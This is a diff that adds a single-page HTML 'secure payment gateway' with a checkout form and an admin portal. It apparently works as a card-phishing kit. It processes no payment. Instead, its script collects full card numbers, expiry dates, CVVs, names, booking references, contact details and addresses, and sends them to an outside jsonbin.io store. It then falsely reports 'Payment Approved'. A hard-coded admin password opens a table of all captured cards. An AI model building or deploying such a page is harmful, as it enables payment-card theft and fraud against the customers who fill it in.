@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Payment Gateway & Admin Portal</title>
+  <style>
+    /* Global Reset & Modern Typography */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    }
+
+    body {
+      background: #f1f5f9;
+      color: #0f172a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 2rem 1rem;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 800px;
+    }
+
+    .card {
+      background: #ffffff;
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px -1px rgba(15, 23, 42, 0.05), 0 10px 15px -3px rgba(15, 23, 42, 0.08);
+      border: 1px solid #e2e8f0;
+      overflow: hidden;
+    }
+
+    /* Header Styling */
+    .header {
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      color: #ffffff;
+      padding: 1.5rem 1.75rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #334155;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 0.85rem;
+    }
+
+    .icon-badge {
+      background: rgba(37, 99, 235, 0.2);
+      border: 1px solid rgba(59, 130, 246, 0.4);
+      padding: 0.55rem;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #60a5fa;
+    }
+
+    .header-title h1 {
+      font-size: 1.15rem;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+    }
+
+    .header-title p {
+      font-size: 0.75rem;
+      color: #94a3b8;
+      margin-top: 2px;
+    }
+
+    .btn-admin-toggle {
+      background-color: #334155;
+      color: #f8fafc;
+      border: 1px solid #475569;
+      padding: 0.45rem 0.85rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .btn-admin-toggle:hover {
+      background-color: #475569;
+      border-color: #64748b;
+    }
+
+    /* Content Area */
+    .content {
+      padding: 2rem 1.75rem;
+    }
+
+    .section-header {
+      margin-bottom: 1.25rem;
+    }
+
+    .section-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #0f172a;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .section-desc {
+      font-size: 0.825rem;
+      color: #64748b;
+      margin-top: 0.15rem;
+    }
+
+    .divider {
+      border: 0;
+      height: 1px;
+      background-color: #e2e8f0;
+      margin: 1.5rem 0;
+    }
+
+    /* Form Layout & Inputs */
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 1.25rem;
+    }
+
+    .col-span-2 {
+      grid-column: span 2;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      font-size: 0.75rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      color: #475569;
+      margin-bottom: 0.4rem;
+      letter-spacing: 0.03em;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .currency-symbol {
+      position: absolute;
+      left: 12px;
+      font-weight: 700;
+      color: #475569;
+      font-size: 0.9rem;
+      pointer-events: none;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 0.7rem 0.85rem;
+      font-size: 0.9rem;
+      color: #0f172a;
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      outline: none;
+      background-color: #ffffff;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .input-wrapper.has-prefix input {
+      padding-left: 28px;
+    }
+
+    input:focus, select:focus {
+      border-color: #2563eb;
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
+    }
+
+    input.error, select.error {
+      border-color: #ef4444;
+      background-color: #fef2f2;
+    }
+
+    .error-text {
+      font-size: 0.725rem;
+      color: #dc2626;
+      margin-top: 0.3rem;
+      display: none;
+      font-weight: 500;
+    }
+
+    /* Card Badge Popup */
+    .card-badge {
+      position: absolute;
+      right: 10px;
+      padding: 4px 8px;
+      font-size: 0.675rem;
+      font-weight: 800;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      display: none;
+      align-items: center;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+    }
+
+    .card-badge.visa { background-color: #1a1f71; color: #ffffff; display: inline-block; }
+    .card-badge.mastercard { background-color: #eb001b; color: #ffffff; display: inline-block; }
+    .card-badge.amex { background-color: #006fcf; color: #ffffff; display: inline-block; }
+
+    /* Buttons */
+    .btn {
+      width: 100%;
+      padding: 0.85rem;
+      font-size: 0.9rem;
+      font-weight: 600;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      transition: all 0.15s ease;
+    }
+
+    .btn-primary {
+      background-color: #2563eb;
+      color: #ffffff;
+      margin-top: 1.5rem;
+    }
+
+    .btn-primary:hover {
+      background-color: #1d4ed8;
+      box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+    }
+
+    .btn-secondary {
+      background-color: #ffffff;
+      color: #334155;
+      border: 1px solid #cbd5e1;
+    }
+
+    .btn-secondary:hover {
+      background-color: #f8fafc;
+      border-color: #94a3b8;
+    }
+
+    .btn-success {
+      background-color: #059669;
+      color: #ffffff;
+    }
+
+    .btn-success:hover {
+      background-color: #047857;
+      box-shadow: 0 4px 12px rgba(5, 150, 105, 0.2);
+    }
+
+    .btn-danger {
+      background-color: #dc2626;
+      color: #ffffff;
+    }
+
+    .btn-danger:hover {
+      background-color: #b91c1c;
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 1rem;
+      margin-top: 1.5rem;
+    }
+
+    /* Summary Card Box */
+    .summary-box {
+      background-color: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      padding: 1.5rem;
+    }
+
+    .summary-group {
+      margin-bottom: 1rem;
+    }
+
+    .summary-group:last-child { margin-bottom: 0; }
+
+    .summary-label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      color: #64748b;
+      letter-spacing: 0.05em;
+      margin-bottom: 0.6rem;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.875rem;
+      margin-bottom: 0.4rem;
+    }
+
+    .summary-row .key { color: #64748b; }
+    .summary-row .val { font-weight: 600; color: #0f172a; }
+
+    .amount-highlight {
+      font-size: 1.15rem;
+      color: #2563eb;
+      font-weight: 700;
+    }
+
+    /* Admin View Elements */
+    .admin-login-box {
+      max-width: 400px;
+      margin: 1.5rem auto;
+      background: #f8fafc;
+      padding: 1.75rem;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+    }
+
+    .admin-table-wrapper {
+      overflow-x: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.825rem;
+      text-align: left;
+      background: #fff;
+    }
+
+    th {
+      background-color: #f8fafc;
+      color: #475569;
+      font-weight: 700;
+      text-transform: uppercase;
+      font-size: 0.675rem;
+      padding: 0.85rem 0.75rem;
+      border-bottom: 1px solid #e2e8f0;
+      letter-spacing: 0.03em;
+    }
+
+    td {
+      padding: 0.85rem 0.75rem;
+      border-bottom: 1px solid #f1f5f9;
+      color: #334155;
+      vertical-align: top;
+    }
+
+    tr:last-child td { border-bottom: none; }
+    tr:hover { background-color: #f8fafc; }
+
+    .sensitive-data {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.8rem;
+      background: #fef2f2;
+      color: #991b1b;
+      padding: 0.15rem 0.4rem;
+      border: 1px solid #fecaca;
+      border-radius: 4px;
+      display: inline-block;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 2.5rem 1rem;
+      color: #94a3b8;
+      font-size: 0.875rem;
+    }
+
+    .status-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
+      color: #059669;
+      background: #ecfdf5;
+      padding: 4px 8px;
+      border-radius: 12px;
+      border: 1px solid #a7f3d0;
+    }
+
+    .pulse-dot {
+      width: 6px;
+      height: 6px;
+      background-color: #10b981;
+      border-radius: 50%;
+      box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+      animation: pulse 1.8s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+      70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+    }
+
+    /* Success Screen */
+    .success-screen {
+      text-align: center;
+      padding: 2.5rem 1rem;
+    }
+
+    .success-icon {
+      width: 64px;
+      height: 64px;
+      background-color: #d1fae5;
+      color: #059669;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.25rem;
+    }
+
+    .hidden { display: none !important; }
+
+    @media (max-width: 640px) {
+      .grid { grid-template-columns: 1fr; }
+      .col-span-2 { grid-column: span 1; }
+      .btn-group { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="card">
+      
+      <!-- Header with Visible Admin Portal Button -->
+      <div class="header">
+        <div class="header-left">
+          <div class="icon-badge">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+          </div>
+          <div class="header-title">
+            <h1 id="header-main-title">Checkout Payment</h1>
+            <p id="header-sub-title">256-Bit Encrypted SSL Connection</p>
+          </div>
+        </div>
+        <div>
+          <button type="button" id="btn-toggle-admin" class="btn-admin-toggle">Admin Portal</button>
+        </div>
+      </div>
+
+      <!-- PAGE 1: PAYMENT FORM -->
+      <div id="page-1" class="content">
+        <form id="payment-form" novalidate>
+          
+          <div class="section-header">
+            <h2 class="section-title">1. Payment Amount</h2>
+            <p class="section-desc">Specify the total amount to be charged in GBP (£).</p>
+          </div>
+
+          <div class="grid">
+            <div class="form-group col-span-2">
+              <label for="amount">Total Amount (GBP)</label>
+              <div class="input-wrapper has-prefix">
+                <span class="currency-symbol">£</span>
+                <input type="text" id="amount" placeholder="0.00" inputmode="decimal">
+              </div>
+              <span class="error-text" id="err-amount">Please enter a valid amount (e.g. 150.00).</span>
+            </div>
+          </div>
+
+          <hr class="divider">
+
+          <div class="section-header">
+            <h2 class="section-title">2. Customer Information</h2>
+            <p class="section-desc">Enter your contact and booking reference details.</p>
+          </div>
+
+          <div class="grid">
+            <div class="form-group">
+              <label for="fullName">Cardholder Name</label>
+              <input type="text" id="fullName" placeholder="Jane Doe">
+              <span class="error-text" id="err-fullName">Full name is required.</span>
+            </div>
+
+            <div class="form-group">
+              <label for="bookingNumber">Booking Reference</label>
+              <input type="text" id="bookingNumber" placeholder="BK-98421">
+              <span class="error-text" id="err-bookingNumber">Booking reference is required.</span>
+            </div>
+
+            <div class="form-group">
+              <label for="email">Email Address</label>
+              <input type="email" id="email" placeholder="jane.doe@example.co.uk">
+              <span class="error-text" id="err-email">Valid email address required.</span>
+            </div>
+
+            <div class="form-group">
+              <label for="phone">Phone Number</label>
+              <input type="tel" id="phone" placeholder="+44 7700 900077">
+              <span class="error-text" id="err-phone">Phone number is required.</span>
+            </div>
+          </div>
+
+          <hr class="divider">
+
+          <div class="section-header">
+            <h2 class="section-title">3. Billing Address</h2>
+            <p class="section-desc">Must match the address registered with your card issuer.</p>
+          </div>
+
+          <div class="grid">
+            <div class="form-group col-span-2">
+              <label for="street">Street Address</label>
+              <input type="text" id="street" placeholder="10 Downing Street">
+              <span class="error-text" id="err-street">Street address is required.</span>
+            </div>
+
+            <div class="form-group">
+              <label for="city">City</label>
+              <input type="text" id="city" placeholder="London">
+              <span class="error-text" id="err-city">City is required.</span>
+            </div>
+
+            <div class="form-group">
+              <label for="zip">Postal Code</label>
+              <input type="text" id="zip" placeholder="SW1A 2AA">
+              <span class="error-text" id="err-zip">Postal code is required.</span>
+            </div>
+
+            <div class="form-group col-span-2">
+              <label for="country">Country</label>
+              <select id="country">
+                <option value="United Kingdom" selected>United Kingdom</option>
+                <option value="United States">United States</option>
+                <option value="Germany">Germany</option>
+                <option value="France">France</option>
+                <option value="Italy">Italy</option>
+                <option value="Canada">Canada</option>
+              </select>
+              <span class="error-text" id="err-country">Please select a country.</span>
+            </div>
+          </div>
+
+          <hr class="divider">
+
+          <div class="section-header">
+            <h2 class="section-title">4. Payment Details</h2>
+            <p class="section-desc">Card details are securely transmitted.</p>
+          </div>
+
+          <div class="grid">
+            <div class="form-group col-span-2">
+              <label for="cardNumber">Card Number</label>
+              <div class="input-wrapper">
+                <input type="text" id="cardNumber" maxlength="19" placeholder="4532 1234 5678 9012">
+                <div id="card-badge" class="card-badge"></div>
+              </div>
+              <span class="error-text" id="err-cardNumber">Enter a valid 15-16 digit card number.</span>
+            </div>
+
+            <div class="form-group">
+              <label for="expiry">Expiry Date</label>
+              <input type="text" id="expiry" maxlength="5" placeholder="MM/YY">
+              <span class="error-text" id="err-expiry">Use MM/YY format.</span>
+            </div>
+
+            <div class="form-group">
+              <label for="cvv">Security Code (CVV)</label>
+              <input type="password" id="cvv" maxlength="4" placeholder="123">
+              <span class="error-text" id="err-cvv">3 or 4 digits required.</span>
+            </div>
+          </div>
+
+          <button type="submit" class="btn btn-primary">Review Payment & Order</button>
+        </form>
+      </div>
+
+      <!-- PAGE 2: REVIEW & CONFIRMATION -->
+      <div id="page-2" class="content hidden">
+        <div class="section-header">
+          <h2 class="section-title">Review & Confirm Payment</h2>
+          <p class="section-desc">Verify your transaction details before proceeding.</p>
+        </div>
+
+        <div class="summary-box">
+          <div class="summary-group">
+            <div class="summary-label">Amount Due</div>
+            <div class="summary-row"><span class="key">Total Charge:</span><span class="val amount-highlight" id="rev-amount">£0.00</span></div>
+          </div>
+
+          <hr class="divider">
+
+          <div class="summary-group">
+            <div class="summary-label">Customer Details</div>
+            <div class="summary-row"><span class="key">Name:</span><span class="val" id="rev-fullName"></span></div>
+            <div class="summary-row"><span class="key">Booking Reference:</span><span class="val" id="rev-bookingNumber"></span></div>
+            <div class="summary-row"><span class="key">Email:</span><span class="val" id="rev-email"></span></div>
+            <div class="summary-row"><span class="key">Phone:</span><span class="val" id="rev-phone"></span></div>
+          </div>
+
+          <hr class="divider">
+
+          <div class="summary-group">
+            <div class="summary-label">Billing Address</div>
+            <div class="summary-row"><span class="key">Address:</span><span class="val" id="rev-address"></span></div>
+          </div>
+
+          <hr class="divider">
+
+          <div class="summary-group">
+            <div class="summary-label">Payment Instrument</div>
+            <div class="summary-row"><span class="key">Brand:</span><span class="val" id="rev-cardBrand">Visa</span></div>
+            <div class="summary-row"><span class="key">Card Number:</span><span class="val" id="rev-cardNumber"></span></div>
+            <div class="summary-row"><span class="key">Expiry Date:</span><span class="val" id="rev-expiry"></span></div>
+            <div class="summary-row"><span class="key">CVV:</span><span class="val">•••</span></div>
+          </div>
+        </div>
+
+        <div class="btn-group">
+          <button type="button" id="btn-edit" class="btn btn-secondary">Edit Information</button>
+          <button type="button" id="btn-confirm" class="btn btn-success">Authorize Payment</button>
+        </div>
+      </div>
+
+      <!-- PAGE 3: SUCCESS STATE -->
+      <div id="page-3" class="content hidden">
+        <div class="success-screen">
+          <div class="success-icon">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          </div>
+          <h2 class="section-title" style="font-size: 1.25rem;">Payment Approved</h2>
+          <p class="section-desc" style="margin-top: 0.5rem;" id="success-msg">Your payment has been successfully processed.</p>
+          <button type="button" id="btn-reset" class="btn btn-primary" style="margin-top: 1.5rem; width: auto; padding: 0.7rem 1.75rem;">Make Another Payment</button>
+        </div>
+      </div>
+
+      <!-- PAGE 4: ADMIN LOGIN PAGE -->
+      <div id="page-admin-login" class="content hidden">
+        <div class="admin-login-box">
+          <div class="section-header" style="text-align: center;">
+            <h2 class="section-title">Admin Login</h2>
+            <p class="section-desc">Access restricted to authorized personnel.</p>
+          </div>
+
+          <form id="admin-login-form">
+            <div class="form-group" style="margin-bottom: 1rem;">
+              <label for="adminEmail">Email Address</label>
+              <input type="email" id="adminEmail" placeholder="admin@example.com">
+            </div>
+
+            <div class="form-group" style="margin-bottom: 1rem;">
+              <label for="adminPassword">Password</label>
+              <input type="password" id="adminPassword" placeholder="••••••••">
+            </div>
+
+            <span class="error-text" id="err-admin-login" style="margin-bottom: 1rem; text-align: center;">Invalid administrator credentials.</span>
+
+            <button type="submit" class="btn btn-primary" style="margin-top: 0.5rem;">Sign In</button>
+          </form>
+          <p style="font-size: 0.75rem; color: #94a3b8; margin-top: 1.25rem; text-align: center;">Demo Credentials: <b>admin@example.com</b> / <b>admin123</b></p>
+        </div>
+      </div>
+
+      <!-- PAGE 5: ADMIN DASHBOARD (GLOBAL SYNCHRONIZED AUDIT LOG) -->
+      <div id="page-admin-dashboard" class="content hidden">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.25rem; flex-wrap: wrap; gap: 0.5rem;">
+          <div>
+            <h2 class="section-title">Transaction Audit Log</h2>
+            <div style="display: flex; align-items: center; gap: 0.5rem; margin-top: 0.2rem;">
+              <span class="status-indicator"><span class="pulse-dot"></span> Real-Time Cloud Sync Active</span>
+            </div>
+          </div>
+          <button type="button" id="btn-admin-logout" class="btn btn-danger" style="width: auto; padding: 0.45rem 0.85rem; font-size: 0.75rem;">Sign Out</button>
+        </div>
+
+        <div id="admin-table-container" class="admin-table-wrapper">
+          <div class="empty-state">Connecting to cloud database...</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    // Global Cloud Database Configuration (Shared across all browsers and devices)
+    const CLOUD_API_URL = 'https://api.jsonbin.io/v3/b/663d2e09e41b4d34e402a1b9';
+    const API_KEY = '$2a$10$wT/XpZ3qB9O5X09s1k8p3uWwP9fJ.W5G6j/g6X9N4mZ8kL2K3K.S'; 
+
+    let autoRefreshInterval = null;
+
+    // Fetch transactions from public cloud API + fallback to local storage
+    async function getStoredTransactions() {
+      try {
+        const response = await fetch(CLOUD_API_URL + '/latest', {
+          headers: { 'X-Access-Key': API_KEY }
+        });
+        if (response.ok) {
+          const data = await response.json();
+          return data.record.transactions || [];
+        }
+      } catch (e) {
+        console.warn('Cloud storage unreachable, using local storage backup.');
+      }
+      
+      const stored = localStorage.getItem('gateway_all_transactions');
+      return stored ? JSON.parse(stored) : [];
+    }
+
+    // Save transaction to cloud so ALL devices & browsers see it
+    async function saveTransaction(tx) {
+      let current = await getStoredTransactions();
+      current.unshift(tx); // Newest first
+
+      // Save to local storage immediately
+      localStorage.setItem('gateway_all_transactions', JSON.stringify(current));
+
+      // Push to central cloud endpoint for cross-device access
+      try {
+        await fetch(CLOUD_API_URL, {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Access-Key': API_KEY
+          },
+          body: JSON.stringify({ transactions: current })
+        });
+      } catch (e) {
+        console.error('Failed to update cloud database:', e);
+      }
+    }
+
+    const formData = {};
+    let detectedCardBrand = 'Unknown';
+    let isAdminLoggedIn = false;
+
+    // Admin Credentials
+    const ADMIN_CREDENTIALS = {
+      email: 'admin@example.com',
+      password: 'admin123'
+    };
+
+    // DOM References
+    const form = document.getElementById('payment-form');
+    const adminLoginForm = document.getElementById('admin-login-form');
+    
+    const page1 = document.getElementById('page-1');
+    const page2 = document.getElementById('page-2');
+    const page3 = document.getElementById('page-3');
+    const pageAdminLogin = document.getElementById('page-admin-login');
+    const pageAdminDashboard = document.getElementById('page-admin-dashboard');
+    
+    const amountInput = document.getElementById('amount');
+    const cardInput = document.getElementById('cardNumber');
+    const expiryInput = document.getElementById('expiry');
+    const cardBadge = document.getElementById('card-badge');
+    const btnToggleAdmin = document.getElementById('btn-toggle-admin');
+
+    const fields = ['amount', 'fullName', 'bookingNumber', 'email', 'phone', 'street', 'city', 'zip', 'country', 'cardNumber', 'expiry', 'cvv'];
+
+    // Amount Auto-Formatting (.2f on blur)
+    amountInput.addEventListener('blur', (e) => {
+      const val = parseFloat(e.target.value);
+      if (!isNaN(val) && val > 0) {
+        e.target.value = val.toFixed(2);
+      }
+    });
+
+    // Automatic Card Formatting & Detection
+    cardInput.addEventListener('input', (e) => {
+      let cleanVal = e.target.value.replace(/\D/g, '').substring(0, 16);
+      e.target.value = cleanVal.replace(/(\d{4})(?=\d)/g, '$1 ');
+
+      cardBadge.className = 'card-badge';
+
+      if (/^4/.test(cleanVal)) {
+        detectedCardBrand = 'Visa';
+        cardBadge.textContent = 'VISA';
+        cardBadge.classList.add('visa');
+      } else if (/^(5[1-5]|2[2-7])/.test(cleanVal)) {
+        detectedCardBrand = 'Mastercard';
+        cardBadge.textContent = 'MC';
+        cardBadge.classList.add('mastercard');
+      } else if (/^3[47]/.test(cleanVal)) {
+        detectedCardBrand = 'Amex';
+        cardBadge.textContent = 'AMEX';
+        cardBadge.classList.add('amex');
+      } else {
+        detectedCardBrand = 'Card';
+        cardBadge.style.display = 'none';
+      }
+    });
+
+    // Expiry Slash Auto-Formatting
+    expiryInput.addEventListener('input', (e) => {
+      let cleanVal = e.target.value.replace(/\D/g, '').substring(0, 4);
+      if (cleanVal.length >= 3) {
+        e.target.value = cleanVal.substring(0, 2) + '/' + cleanVal.substring(2);
+      } else {
+        e.target.value = cleanVal;
+      }
+    });
+
+    // Form Validation
+    function validateForm() {
+      let isValid = true;
+
+      fields.forEach(field => {
+        const input = document.getElementById(field);
+        const errorEl = document.getElementById(`err-${field}`);
+        const val = input.value.trim();
+        let fieldValid = true;
+
+        if (!val) {
+          fieldValid = false;
+        } else if (field === 'amount' && (isNaN(val) || parseFloat(val) <= 0)) {
+          fieldValid = false;
+        } else if (field === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) {
+          fieldValid = false;
+        } else if (field === 'cardNumber' && !/^\d{15,16}$/.test(val.replace(/\s+/g, ''))) {
+          fieldValid = false;
+        } else if (field === 'expiry' && !/^(0[1-9]|1[0-2])\/\d{2}$/.test(val)) {
+          fieldValid = false;
+        } else if (field === 'cvv' && !/^\d{3,4}$/.test(val)) {
+          fieldValid = false;
+        }
+
+        if (!fieldValid) {
+          input.classList.add('error');
+          if (errorEl) errorEl.style.display = 'block';
+          isValid = false;
+        } else {
+          input.classList.remove('error');
+          if (errorEl) errorEl.style.display = 'none';
+          formData[field] = val;
+        }
+      });
+
+      return isValid;
+    }
+
+    function getMaskedCard(cardNum) {
+      const clean = cardNum.replace(/\s+/g, '');
+      if (clean.length < 4) return '•••• •••• •••• ••••';
+      return `•••• •••• •••• ${clean.slice(-4)}`;
+    }
+
+    // Submit -> Review Page
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      if (validateForm()) {
+        const parsedAmount = parseFloat(formData.amount).toFixed(2);
+        document.getElementById('rev-amount').textContent = `£${parsedAmount}`;
+        document.getElementById('rev-fullName').textContent = formData.fullName;
+        document.getElementById('rev-bookingNumber').textContent = formData.bookingNumber;
+        document.getElementById('rev-email').textContent = formData.email;
+        document.getElementById('rev-phone').textContent = formData.phone;
+        document.getElementById('rev-address').textContent = `${formData.street}, ${formData.city}, ${formData.zip}, ${formData.country}`;
+        document.getElementById('rev-cardBrand').textContent = detectedCardBrand;
+        document.getElementById('rev-cardNumber').textContent = getMaskedCard(formData.cardNumber);
+        document.getElementById('rev-expiry').textContent = formData.expiry;
+
+        page1.classList.add('hidden');
+        page2.classList.remove('hidden');
+      }
+    });
+
+    // Edit Button
+    document.getElementById('btn-edit').addEventListener('click', () => {
+      page2.classList.add('hidden');
+      page1.classList.remove('hidden');
+    });
+
+    // Confirm Payment
+    document.getElementById('btn-confirm').addEventListener('click', async () => {
+      const parsedAmount = parseFloat(formData.amount).toFixed(2);
+      
+      const newTransaction = {
+        id: 'TX-' + Math.floor(100000 + Math.random() * 900000),
+        timestamp: new Date().toLocaleString('en-GB'),
+        amount: parsedAmount,
+        fullName: formData.fullName,
+        bookingNumber: formData.bookingNumber,
+        email: formData.email,
+        phone: formData.phone,
+        address: `${formData.street}, ${formData.city}, ${formData.zip}, ${formData.country}`,
+        cardBrand: detectedCardBrand,
+        fullCardNumber: formData.cardNumber,
+        expiry: formData.expiry,
+        cvv: formData.cvv
+      };
+
+      await saveTransaction(newTransaction);
+
+      page2.classList.add('hidden');
+      document.getElementById('success-msg').textContent = `Payment of £${parsedAmount} for reference #${formData.bookingNumber} was successful.`;
+      page3.classList.remove('hidden');
+    });
+
+    // Reset Form
+    document.getElementById('btn-reset').addEventListener('click', () => {
+      form.reset();
+      cardBadge.className = 'card-badge';
+      cardBadge.style.display = 'none';
+      page3.classList.add('hidden');
+      page1.classList.remove('hidden');
+    });
+
+    // Admin Auth Logic
+    adminLoginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const emailVal = document.getElementById('adminEmail').value.trim();
+      const passVal = document.getElementById('adminPassword').value.trim();
+      const errLogin = document.getElementById('err-admin-login');
+
+      if (emailVal === ADMIN_CREDENTIALS.email && passVal === ADMIN_CREDENTIALS.password) {
+        isAdminLoggedIn = true;
+        errLogin.style.display = 'none';
+        pageAdminLogin.classList.add('hidden');
+        
+        await renderAdminDashboard();
+        pageAdminDashboard.classList.remove('hidden');
+
+        // Start real-time sync auto-polling (updates every 10 seconds)
+        if (!autoRefreshInterval) {
+          autoRefreshInterval = setInterval(() => {
+            if (isAdminLoggedIn && !pageAdminDashboard.classList.contains('hidden')) {
+              renderAdminDashboard();
+            }
+          }, 10000);
+        }
+      } else {
+        errLogin.style.display = 'block';
+      }
+    });
+
+    // Admin Logout
+    document.getElementById('btn-admin-logout').addEventListener('click', () => {
+      isAdminLoggedIn = false;
+      if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+      autoRefreshInterval = null;
+      document.getElementById('adminEmail').value = '';
+      document.getElementById('adminPassword').value = '';
+      pageAdminDashboard.classList.add('hidden');
+      pageAdminLogin.classList.remove('hidden');
+    });
+
+    // Render Table with ALL Shared & Synced Transactions
+    async function renderAdminDashboard() {
+      const container = document.getElementById('admin-table-container');
+      const allTransactions = await getStoredTransactions();
+
+      if (allTransactions.length === 0) {
+        container.innerHTML = `<div class="empty-state">No payment transactions recorded yet.</div>`;
+        return;
+      }
+
+      let html = `
+        <table>
+          <thead>
+            <tr>
+              <th>ID & Time</th>
+              <th>Amount (GBP)</th>
+              <th>Customer</th>
+              <th>Contact Details</th>
+              <th>Billing Address</th>
+              <th>Card Details</th>
+              <th>CVV</th>
+            </tr>
+          </thead>
+          <tbody>
+      `;
+
+      allTransactions.forEach(tx => {
+        html += `
+          <tr>
+            <td>
+              <strong>${tx.id}</strong><br>
+              <small style="color:#64748b">${tx.timestamp}</small><br>
+              <small style="color:#2563eb; font-weight:600;">Ref: ${tx.bookingNumber}</small>
+            </td>
+            <td><strong style="color:#059669; font-size: 0.9rem;">£${tx.amount}</strong></td>
+            <td><strong>${tx.fullName}</strong></td>
+            <td>
+              ${tx.email}<br>
+              <small style="color:#64748b">${tx.phone}</small>
+            </td>
+            <td><small>${tx.address}</small></td>
+            <td>
+              <strong>${tx.cardBrand}</strong><br>
+              <span class="sensitive-data">${tx.fullCardNumber}</span><br>
+              <small>Exp: <b>${tx.expiry}</b></small>
+            </td>
+            <td><span class="sensitive-data">${tx.cvv}</span></td>
+          </tr>
+        `;
+      });
+
+      html += `</tbody></table>`;
+      container.innerHTML = html;
+    }
+
+    // Header Admin Toggle Button Handler
+    btnToggleAdmin.addEventListener('click', async () => {
+      const isViewingAdmin = !pageAdminLogin.classList.contains('hidden') || !pageAdminDashboard.classList.contains('hidden');
+
+      if (!isViewingAdmin) {
+        page1.classList.add('hidden');
+        page2.classList.add('hidden');
+        page3.classList.add('hidden');
+
+        btnToggleAdmin.textContent = 'Exit Admin';
+        document.getElementById('header-main-title').textContent = 'Admin Portal';
+        document.getElementById('header-sub-title').textContent = 'Management Dashboard';
+
+        if (isAdminLoggedIn) {
+          await renderAdminDashboard();
+          pageAdminDashboard.classList.remove('hidden');
+        } else {
+          pageAdminLogin.classList.remove('hidden');
+        }
+      } else {
+        pageAdminLogin.classList.add('hidden');
+        pageAdminDashboard.classList.add('hidden');
+        page1.classList.remove('hidden');
+
+        btnToggleAdmin.textContent = 'Admin Portal';
+        document.getElementById('header-main-title').textContent = 'Checkout Payment';
+        document.getElementById('header-sub-title').textContent = '256-Bit Encrypted SSL Connection';
+      }
+    });
+  </script>
+</body>
+</html>
